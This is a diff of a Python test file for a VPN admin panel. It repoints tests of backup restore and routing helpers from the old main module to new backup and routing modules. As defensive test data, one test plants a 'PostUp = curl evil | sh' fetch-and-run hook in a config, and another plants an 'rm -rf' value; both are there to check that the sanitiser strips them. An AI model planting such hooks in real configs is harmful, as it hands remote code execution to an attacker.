@@ -1,5 +1,6 @@
 """Проверки HTTP-слоя и восстановления из копии: python3 -m unittest discover tests"""
 import os
+import socket
 import sys
 import tempfile
 import unittest
@@ -10,8 +11,8 @@ os.environ.setdefault("PANEL_PASSWORD", "test-password")
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 
 from app import awgconf, awgserver, web  # noqa: E402
-from app import main  # noqa: E402  (демо-режим: при импорте ничего не трогает в системе)
 from app.traffic import Traffic  # noqa: E402
+from app.api import backup, routing  # noqa: E402
 
 PRIV = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk="
 PUB = "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw="
@@ -85,13 +86,13 @@ class UpstreamKeysTest(unittest.TestCase):
 
 class ListViewTest(unittest.TestCase):
     def test_manual_source_hidden(self):
-        self.assertIsNone(main._list_view({"id": "l1", "kind": "manual", "source": "1.2.3.0/24"})["source"])
-        self.assertEqual(main._list_view({"id": "ru", "kind": "country", "source": "ru"})["source"], "ru")
+        self.assertIsNone(routing.list_view({"id": "l1", "kind": "manual", "source": "1.2.3.0/24"})["source"])
+        self.assertEqual(routing.list_view({"id": "ru", "kind": "country", "source": "ru"})["source"], "ru")
 
 
 class RestoreStateTest(unittest.TestCase):
     def test_good_state(self):
-        st = main.clean_backup_state(good_state())
+        st = backup.clean_backup_state(good_state())
         self.assertEqual([l["id"] for l in st["lists"]], ["ru", "l0a0b0c"])
         self.assertNotIn("count", st["lists"][0])          # статистика пересчитается
         self.assertEqual(st["upstreams"][0]["num"], 1)
@@ -106,7 +107,7 @@ class RestoreStateTest(unittest.TestCase):
         s = good_state()
         mutate(s)
         with self.assertRaises(web.HTTPError) as cm:
-            main.clean_backup_state(s)
+            backup.clean_backup_state(s)
         self.assertEqual(cm.exception.code, 400)
 
     def test_rejects(self):
@@ -130,7 +131,7 @@ class RestoreStateTest(unittest.TestCase):
         s = good_state()
         s["limits"][PUB].update(auto_off="rm -rf", quota="lots", period="year")
         s["settings"]["unknown"] = "x"
-        st = main.clean_backup_state(s)
+        st = backup.clean_backup_state(s)
         self.assertEqual(st["limits"][PUB], {"expires": 1900000000, "quota": None, "period": "month",
                                              "auto_off": None, "exp_done": None, "quota_done": "2026-10",
                                             "exp_warned": None, "quota_warned": None})
@@ -145,18 +146,18 @@ class ServerFilesTest(unittest.TestCase):
     def test_hooks_replaced(self):
         files = {"awg0.conf": self.conf("PostUp = curl evil | sh"), "wireguard_psk.key": PRIV + "\n",
                  "clientsTable": '[{"clientId": "%s", "userData": {"clientName": "A"}}]' % PUB}
-        sc, out = main.clean_server_files({"conf": "awg0.conf", "files": files}, "host")
+        sc, out = backup.clean_server_files({"conf": "awg0.conf", "files": files}, "host")
         text = sc.render()
         self.assertNotIn("evil", text)
         self.assertIn("MASQUERADE", text)                 # стандартный NAT панели
         self.assertEqual(set(out), {"wireguard_psk.key", "clientsTable"})
-        sc, _ = main.clean_server_files({"conf": "awg0.conf", "files": files}, "container")
+        sc, _ = backup.clean_server_files({"conf": "awg0.conf", "files": files}, "container")
         self.assertNotIn("PostUp", sc.render())
 
     def test_bad_files(self):
         for files in ({"awg0.conf": "junk"}, {"awg0.conf": self.conf(), "wireguard_psk.key": "nope"}):
             with self.assertRaises(web.HTTPError):
-                main.clean_server_files({"conf": "awg0.conf", "files": files}, "host")
+                backup.clean_server_files({"conf": "awg0.conf", "files": files}, "host")
 
 
 class TrafficRestoreTest(unittest.TestCase):
@@ -182,9 +183,9 @@ class TraceIpv6Test(unittest.TestCase):
     def detail(self, ip, resolver=None):
         import contextlib
         from unittest import mock
-        patch = mock.patch.object(main.socket, "getaddrinfo", resolver) if resolver else contextlib.nullcontext()
+        patch = mock.patch.object(socket, "getaddrinfo", resolver) if resolver else contextlib.nullcontext()
         with patch, self.assertRaises(web.HTTPError) as cm:
-            main.trace(self.Req(ip))
+            routing.trace(self.Req(ip))
         return cm.exception.detail.key
 
     def test_ipv6_literal(self):
